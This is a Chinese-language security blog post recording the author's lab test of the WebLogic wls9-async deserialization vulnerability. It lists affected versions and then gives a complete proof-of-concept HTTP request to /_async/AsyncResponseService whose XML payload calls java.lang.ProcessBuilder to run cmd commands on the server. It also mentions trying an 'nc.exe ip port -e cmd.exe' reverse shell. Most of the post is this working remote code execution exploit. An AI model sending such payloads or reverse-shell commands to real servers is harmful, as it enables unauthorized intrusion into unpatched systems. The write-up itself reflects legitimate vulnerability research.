<!DOCTYPE html><html lang="zh_CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> WebLogic_wls9-async_反序列化漏洞 · Exi1Sh0w's Blog</title><meta name="description" content="努力努力再努力..."><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/favicon.png"><link rel="stylesheet" href="/css/jekyll.css"><!--[if lt IE 9]>
<script src="js/html5shiv.min.js"></script>
<script src="js/respond.min.js"></script>
<![endif]--><meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Exi1Sh0w's Blog" type="application/atom+xml">
</head><body><header class="row-flex-row limit-width vh-center"><a href="/" class="logo"><img src="/favicon.png"></a><nav><ul class="nav-list"><li class="nav-list-item"><a href="/" class="nav-link">Home</a></li><li class="nav-list-item"><a href="/archives/" class="nav-link active">   Blog</a></li><li class="nav-list-item"><a href="https://github.com/exi1sh0w" target="_blank" class="nav-link">github</a></li><li class="nav-list-item"><a href="/atom.xml" class="nav-link">rss</a></li></ul></nav></header><div class="container limit-width"><section class="row-flex-row"><div class="post"><article class="post-block"><h2 class="post-title"><a href="/2019/04/26/WebLogic-wls9-async-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="post-title-link">WebLogic_wls9-async_反序列化漏洞</a></h2><div class="post-meta"><div class="post-time">星期五, 四月 26日 2019</div></div><div class="post-content"><h2 id="前两天在网上看到weblogic又又又爆出漏洞，搭建环境测试了一波"><a href="#前两天在网上看到weblogic又又又爆出漏洞，搭建环境测试了一波" class="headerlink" title="前两天在网上看到weblogic又又又爆出漏洞，搭建环境测试了一波"></a>前两天在网上看到weblogic又又又爆出漏洞，搭建环境测试了一波</h2><h3 id="测试环境版本："><a href="#测试环境版本：" class="headerlink" title="测试环境版本："></a>测试环境版本：</h3><p>1、OS:Windows Server 2016 Standard x64</p>
<p>2、Java:1.8.0_211</p>
<h3 id="影响版本以及背景"><a href="#影响版本以及背景" class="headerlink" title="影响版本以及背景"></a>影响版本以及背景</h3><p>1、主要是影响一下4个版本</p>
<p>Oracle WebLogic Server10.3.6.0.0<br>Oracle WebLogic Server12.1.3.0.0     &lt; 本次测试的为这个版本<br>Oracle WebLogic Server12.2.1.1.0<br>Oracle WebLogic Server12.2.1.2.0</p>
<p>2、下载安装其中4个版本的某一个后(当然需要先安装jkd环境)，通过各位大佬的总结，说是只要能够访问/_async/AsyncResponseService就表示有该漏洞(为了验证该说法，我又安装了最相信的版本的weblogic，至少该目录的确无法访问了…)</p>
<h3 id="测试POC"><a href="#测试POC" class="headerlink" title="测试POC"></a>测试POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;_async&#x2F;AsyncResponseService HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.1.26:7001</span><br><span class="line">Content-Length: 755</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">SOAPAction: </span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">User-Agent: Apache-HttpClient&#x2F;4.1.1 (java 1.5)</span><br><span class="line">Connection: keep-alive</span><br><span class="line">content-type: text&#x2F;xml</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot; xmlns:wsa&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2005&#x2F;08&#x2F;addressing&quot; xmlns:asy&#x3D;&quot;http:&#x2F;&#x2F;www.bea.com&#x2F;async&#x2F;AsyncResponseService&quot;&gt;   </span><br><span class="line">&lt;soapenv:Header&gt; </span><br><span class="line">&lt;wsa:Action&gt;xx&lt;&#x2F;wsa:Action&gt;</span><br><span class="line">&lt;wsa:RelatesTo&gt;xx&lt;&#x2F;wsa:RelatesTo&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work&#x3D;&quot;http:&#x2F;&#x2F;bea.com&#x2F;2004&#x2F;06&#x2F;soap&#x2F;workarea&#x2F;&quot;&gt;</span><br><span class="line">&lt;void class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class&#x3D;&quot;java.lang.String&quot; length&#x3D;&quot;3&quot;&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;cmd&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;&#x2F;c&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;echo &quot;hello,world&quot; &gt; c:\a.txt&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;&#x2F;array&gt;</span><br><span class="line">&lt;void method&#x3D;&quot;start&quot;&#x2F;&gt;&lt;&#x2F;void&gt;</span><br><span class="line">&lt;&#x2F;work:WorkContext&gt;</span><br><span class="line">&lt;&#x2F;soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body&gt;</span><br><span class="line">&lt;asy:onAsyncDelivery&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;soapenv:Body&gt;&lt;&#x2F;soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>

<p>由于使用的是windows的操作系统，所以就测试了下往C盘下写入个txt</p>
<p>ps:在实验的过程中，我本来是想使用命令nc.exe ip port -e cmd.exe的形式返回shell，但不知道为何并没有执行…</p>
<p>已把nc.exe放入administrator根目录，直接手打测试是可以得到一个返回shell的，不知道是啥原因</p>
</div></article><div class="pagination"><span class="pagination-prev">PREV</span><a href="/2019/04/06/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/" class="pagination-next">NEXT</a></div><div class="comments"></div></div><aside class="sidebar"><h3>最新文章</h3><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/04/26/WebLogic-wls9-async-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">WebLogic_wls9-async_反序列化漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/06/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/">Nodejs的一些问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/02/xss%E8%AE%B0%E5%BD%95/">xss记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/15/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">逻辑漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/06/%E5%90%8E%E9%97%A8%E5%BD%92%E7%B1%BB/">后门归类</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/16/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传的攻击/防御</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/03/Markdown%E7%BC%96%E8%BE%91%E5%99%A8typora_xss/">Markdown编辑器typora_xss</a></li></ul></aside></section></div><div class="extra"></div><footer class="footer"><div class="row-flex-row limit-width vh-center"><div class="copyright"><P>© 2020 <a href="/">Exi1Sh0w</P></div><div class="power"><p></p></div></div></footer><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-80781234-1",'auto');ga('send','pageview');</script><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "//hm.baidu.com/hm.js?ee75cf111111aa99f8540efa2570970";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script></body></html>